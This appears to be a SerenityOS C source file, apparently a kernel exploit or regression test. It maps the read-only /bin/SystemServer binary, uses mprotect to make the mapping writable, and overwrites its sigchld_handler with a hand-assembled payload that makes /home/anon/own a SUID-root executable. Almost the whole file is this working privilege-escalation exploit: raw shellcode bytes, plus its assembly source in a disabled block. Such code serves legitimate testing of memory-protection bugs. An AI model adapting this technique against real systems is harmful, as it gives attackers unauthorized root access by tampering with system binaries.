/*
 * Copyright (c) 2018-2020, the SerenityOS developers.
 *
 * SPDX-License-Identifier: BSD-2-Clause
 */

#include <AK/Types.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main()
{
    int fd = open("/bin/SystemServer", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    u8* ptr = (u8*)mmap(nullptr, 16384, PROT_READ, MAP_SHARED, fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    if (mprotect(ptr, 16384, PROT_READ | PROT_WRITE) < 0) {
        perror("mprotect");
        return 1;
    }

    /*
     *
     * This payload replaces the start of sigchld_handler in the /bin/SystemServer file.
     * It does two things:
     *
     * chown ("/home/anon/own", 0, 0);
     * chmod ("/home/anon/own", 04755);
     *
     * In other words, it turns "/home/anon/own" into a SUID-root executable! :^)
     *
     */

#if 0
    [bits 32]
    [org 0x0804b111]
    jmp $+17
    path:
    db "/home/anon/own", 0
    mov eax, 79
    mov edx, path
    mov ecx, 0
    mov ebx, 0
    int 0x82
    mov eax, 67
    mov edx, path
    mov ecx, 15
    mov ebx, 2541
    int 0x82
    ret
#endif

    u8 const payload[] = {
        0xeb, 0x0f, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x61, 0x6e, 0x6f,
        0x6e, 0x2f, 0x6f, 0x77, 0x6e, 0x00, 0xb8, 0x4f, 0x00, 0x00, 0x00,
        0xba, 0x13, 0xb1, 0x04, 0x08, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xbb,
        0x00, 0x00, 0x00, 0x00, 0xcd, 0x82, 0xb8, 0x43, 0x00, 0x00, 0x00,
        0xba, 0x13, 0xb1, 0x04, 0x08, 0xb9, 0x0f, 0x00, 0x00, 0x00, 0xbb,
        0xed, 0x09, 0x00, 0x00, 0xcd, 0x82, 0xc3
    };

    memcpy(&ptr[0x3111], payload, sizeof(payload));

    printf("ok\n");
    return 0;
}
